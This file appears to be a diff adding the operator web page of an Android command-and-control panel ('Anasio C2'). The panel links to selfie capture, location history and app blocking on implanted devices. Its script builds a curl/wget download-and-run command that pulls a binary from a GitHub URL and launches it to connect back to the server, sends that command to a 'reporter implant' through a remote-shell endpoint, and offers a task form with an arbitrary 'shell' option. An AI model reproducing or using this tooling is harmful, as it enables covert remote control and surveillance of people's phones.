@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Updater Manager — Anasio C2</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #f3f4f6; color: #111827; margin: 0; }
+        .container { max-width: 1100px; margin: 0 auto; padding: 24px; }
+        .card { background: #fff; border: 1px solid #e5e7eb; border-radius: 24px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.06); padding: 28px; margin-bottom: 24px; }
+        .badge { display: inline-flex; align-items: center; justify-content: center; background: #eef2ff; color: #4338ca; font-weight: 700; padding: 8px 12px; border-radius: 9999px; font-size: 0.75rem; letter-spacing: 0.05em; }
+        .field { display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; }
+        label { font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; }
+        input, select, textarea { width: 100%; border: 1px solid #d1d5db; border-radius: 16px; padding: 14px 16px; font-size: 0.95rem; color: #111827; background: #f9fafb; }
+        textarea { min-height: 150px; resize: vertical; }
+        button { font-weight: 700; border-radius: 16px; padding: 14px 20px; border: none; cursor: pointer; transition: transform 120ms ease, background-color 120ms ease; }
+        button:hover { transform: translateY(-1px); }
+        .btn-primary { background: #4338ca; color: #fff; }
+        .btn-secondary { background: #e5e7eb; color: #111827; }
+        .grid { display: grid; gap: 18px; }
+        .grid-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        pre { background: #111827; color: #f9fafb; padding: 18px; border-radius: 18px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9rem; }
+        .nav { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 24px; }
+        .nav a { font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #4b5563; text-decoration: none; }
+        .nav a:hover { color: #1f2937; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav">
+            <a href="/">Dashboard</a>
+            <a href="/apps_view">App Blocker</a>
+            <a href="/selfies_view">Selfies</a>
+            <a href="/errors_view">Diagnostics</a>
+            <a href="/history_view">Location History</a>
+            <a href="/updater_view">Updater</a>
+        </div>
+
+        <div class="card">
+            <div style="display:flex; align-items:center; justify-content:space-between; gap:14px; flex-wrap:wrap; margin-bottom:18px;">
+                <div>
+                    <p style="font-size:0.75rem; color:#6b7280; letter-spacing:0.12em; text-transform:uppercase; margin:0 0 8px 0;">Updater Manager</p>
+                    <h1 style="font-size:1.8rem; margin:0;">Download & launch updater helper</h1>
+                </div>
+                <span class="badge">Same server / different process</span>
+            </div>
+            <div class="grid">
+                <div class="field">
+                    <label for="reporter-device">Reporter device ID</label>
+                    <select id="reporter-device"></select>
+                </div>
+                <div class="field">
+                    <label for="updater-device-id">Updater helper device ID</label>
+                    <input id="updater-device-id" type="text" placeholder="updater_TARGETID" />
+                </div>
+                <div class="field">
+                    <label for="updater-url">Hosted updater binary URL</label>
+                    <input id="updater-url" type="text" value="https://raw.githubusercontent.com/gerach07/android-telemetry-server/main/web/static/updater.bin" />
+                </div>
+                <div class="field">
+                    <label for="reporter-path">Reporter binary path on device</label>
+                    <input id="reporter-path" type="text" value="/data/local/tmp/reporter" />
+                </div>
+                <div class="field">
+                    <label for="updater-save-path">Updater save path</label>
+                    <input id="updater-save-path" type="text" value="/data/local/tmp/updater.bin" />
+                </div>
+            </div>
+            <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:12px;">
+                <button id="download-launch-btn" class="btn-primary">Download & Launch Helper</button>
+                <button id="refresh-btn" class="btn-secondary">Refresh Devices</button>
+            </div>
+            <p style="margin-top:16px; color:#4b5563; font-size:0.95rem;">This helper will be downloaded by the current reporter implant and started as a separate updater process. The updater can upload its own connection back to the same C2 server and manage the reporter binary safely.</p>
+        </div>
+
+        <div class="card">
+            <h2 style="font-size:1.3rem; margin:0 0 14px 0;">Send task to updater</h2>
+            <div class="grid grid-2">
+                <div class="field">
+                    <label for="updater-connection">Updater connection ID</label>
+                    <select id="updater-connection"></select>
+                </div>
+                <div class="field">
+                    <label for="updater-task">Updater task</label>
+                    <select id="updater-task">
+                        <option value="download_reporter">download_reporter</option>
+                        <option value="replace_reporter">replace_reporter</option>
+                        <option value="stop_reporter">stop_reporter</option>
+                        <option value="start_reporter">start_reporter</option>
+                        <option value="shell">shell</option>
+                        <option value="status">status</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label for="task-payload">Task payload (JSON)</label>
+                <textarea id="task-payload">{"url":"https://raw.githubusercontent.com/gerach07/android-telemetry-server/main/web/static/updater.bin","destination":"/data/local/tmp/reporter","command":"echo hello"}</textarea>
+            </div>
+            <div style="display:flex; gap:12px; flex-wrap:wrap;">
+                <button id="send-task-btn" class="btn-primary">Send task to updater</button>
+            </div>
+            <p style="margin-top:16px; color:#4b5563;">Use this to control the updater helper once it has connected. The helper forwards status and error responses back into the existing C2 server pipeline.</p>
+        </div>
+
+        <div class="card">
+            <h2 style="font-size:1.3rem; margin:0 0 14px 0;">Latest command feedback</h2>
+            <pre id="task-response">No response yet.</pre>
+        </div>
+    </div>
+
+    <script>
+        const reporterSelect = document.getElementById('reporter-device');
+        const updaterConnectionSelect = document.getElementById('updater-connection');
+        const updaterDeviceIdInput = document.getElementById('updater-device-id');
+        const updaterUrlInput = document.getElementById('updater-url');
+        const reporterPathInput = document.getElementById('reporter-path');
+        const updaterSavePathInput = document.getElementById('updater-save-path');
+        const downloadLaunchBtn = document.getElementById('download-launch-btn');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const sendTaskBtn = document.getElementById('send-task-btn');
+        const taskPayloadInput = document.getElementById('task-payload');
+        const taskResponse = document.getElementById('task-response');
+
+        async function fetchReporterDevices() {
+            try {
+                const res = await fetch('/devices');
+                if (!res.ok) return;
+                const data = await res.json();
+                reporterSelect.innerHTML = '';
+                if (Array.isArray(data.devices) && data.devices.length) {
+                    data.devices.forEach(did => {
+                        const opt = document.createElement('option');
+                        opt.value = did;
+                        opt.textContent = did;
+                        reporterSelect.appendChild(opt);
+                    });
+                } else {
+                    const opt = document.createElement('option');
+                    opt.value = '';
+                    opt.textContent = 'No reporters connected';
+                    reporterSelect.appendChild(opt);
+                }
+                if (!updaterDeviceIdInput.value && data.devices.length) {
+                    updaterDeviceIdInput.value = 'updater_' + data.devices[0];
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function fetchActiveConnections() {
+            try {
+                const res = await fetch('/active_connections');
+                if (!res.ok) return;
+                const data = await res.json();
+                updaterConnectionSelect.innerHTML = '';
+                if (Array.isArray(data.connections) && data.connections.length) {
+                    data.connections.forEach(id => {
+                        const opt = document.createElement('option');
+                        opt.value = id;
+                        opt.textContent = id;
+                        updaterConnectionSelect.appendChild(opt);
+                    });
+                } else {
+                    const opt = document.createElement('option');
+                    opt.value = '';
+                    opt.textContent = 'No active updater connection';
+                    updaterConnectionSelect.appendChild(opt);
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        function buildLaunchCommand() {
+            const url = updaterUrlInput.value.trim();
+            const savePath = updaterSavePathInput.value.trim();
+            const reporterPath = reporterPathInput.value.trim();
+            const updaterId = updaterDeviceIdInput.value.trim();
+            if (!url || !savePath || !reporterPath || !updaterId) {
+                throw new Error('Fill all required updater fields.');
+            }
+
+            const escapedUrl = url.replace(/"/g, '\\"');
+            const escapedSave = savePath.replace(/"/g, '\\"');
+            const escapedReporter = reporterPath.replace(/"/g, '\\"');
+            const serverUrl = window.location.origin.replace(/^http:/, 'https:') + '/ws';
+
+            const downloadCmd = `if command -v curl >/dev/null 2>&1; then curl -fsSL \"${escapedUrl}\" -o \"${escapedSave}\"; elif command -v wget >/dev/null 2>&1; then wget -qO \"${escapedSave}\" \"${escapedUrl}\"; elif command -v busybox >/dev/null 2>&1; then busybox wget -qO \"${escapedSave}\" \"${escapedUrl}\"; else exit 1; fi`;
+            const launchCmd = `chmod +x \"${escapedSave}\" && sh -c \"\\\"${escapedSave}\\\" --server-url ${serverUrl} --device-id ${updaterId} --reporter-path \\\"${escapedReporter}\\\" >/data/local/tmp/updater.log 2>&1 &\"`;
+            return `${downloadCmd} && ${launchCmd}`;
+        }
+
+        downloadLaunchBtn.addEventListener('click', async () => {
+            try {
+                if (!reporterSelect.value) {
+                    alert('Select a reporter device first.');
+                    return;
+                }
+                const cmd = buildLaunchCommand();
+                const fd = new FormData();
+                fd.append('device_id', reporterSelect.value);
+                fd.append('command', cmd);
+                const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
+                if (res.ok) {
+                    taskResponse.textContent = 'Updater launch command sent. Wait for the helper connection to appear in Active Connections.';
+                } else {
+                    taskResponse.textContent = 'Failed to send updater launch command.';
+                }
+            } catch (err) {
+                taskResponse.textContent = err.message;
+            }
+        });
+
+        refreshBtn.addEventListener('click', async () => {
+            await fetchReporterDevices();
+            await fetchActiveConnections();
+        });
+
+        sendTaskBtn.addEventListener('click', async () => {
+            if (!updaterConnectionSelect.value) {
+                alert('Select an active updater connection first.');
+                return;
+            }
+            const task = document.getElementById('updater-task').value;
+            const payload = taskPayloadInput.value.trim() || '{}';
+            const fd = new FormData();
+            fd.append('device_id', updaterConnectionSelect.value);
+            fd.append('task', task);
+            fd.append('payload', payload);
+            const res = await fetch('/send_task', { method: 'POST', body: fd });
+            const data = await res.json();
+            taskResponse.textContent = JSON.stringify(data, null, 2);
+        });
+
+        window.addEventListener('load', async () => {
+            await fetchReporterDevices();
+            await fetchActiveConnections();
+        });
+    </script>
+</body>
+</html>
